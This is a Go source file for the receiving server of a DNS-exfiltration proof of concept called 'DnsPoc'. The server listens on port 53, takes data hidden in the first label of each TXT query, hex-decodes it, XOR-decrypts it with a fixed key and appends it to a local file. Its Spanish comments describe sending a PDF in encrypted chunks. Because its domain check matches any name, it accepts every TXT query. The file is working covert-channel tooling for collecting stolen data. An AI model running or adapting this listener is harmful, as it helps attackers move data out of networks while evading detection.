package main

import (
	"DnsPoc/dnserver/banner"
	"DnsPoc/dnserver/help"
	"encoding/hex"
	"fmt"
	"github.com/fatih/color"
	"github.com/miekg/dns"
	"log"
	"os"
	"strconv"
	"strings"
)

// funcion nucleo

type handler struct{}

func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	msg.SetReply(r)

	switch r.Question[0].Qtype {
	case dns.TypeTXT:
		msg.Authoritative = true
		dominio := msg.Question[0].Name

		var requestData = map[string]string{
			dominio: "cursortod.com.",
		}
		_, ok := requestData[dominio]

		if ok {
			color.Yellow("Data received")
			color.Green(dominio + "\n")

			msg.Answer = append(msg.Answer, &dns.TXT{
				Hdr: dns.RR_Header{Name: dominio, Rrtype: dns.TypeTXT, Class: dns.ClassINET,
					Ttl: 5},
				Txt: []string{"data enviada"},
			})
			split := strings.Split(dominio, ".")
			split2 := split[0]

			decode, myerr := hex.DecodeString(split2)

			if myerr != nil {
				fmt.Printf("Error decoding")
			}

			decrypt := help.Xor(decode, 87)

			p, perr := os.OpenFile("data.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0666)
			if perr != nil {
				fmt.Printf("error creando el archivo")

			}
			defer p.Close()

			p.Write(decrypt)

			//pdf file 20 bytes
			// chunk 10 - 10
			// se envia codificado y cifrado el primer corte asdvsddsdfdsfdfsfsffff.
			// se envia la segunda parte sddasdasfafafaffdfdfdfd.

			// la union de las dos partes = test.pdf

		}
	}

	w.WriteMsg(&msg)

}

func main() {
	color.Blue(banner.Banner)
	srv := &dns.Server{Addr: ":" + strconv.Itoa(53), Net: "udp"}

	srv.Handler = &handler{}

	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("error listening on server: %s\n", err.Error())
	}

}
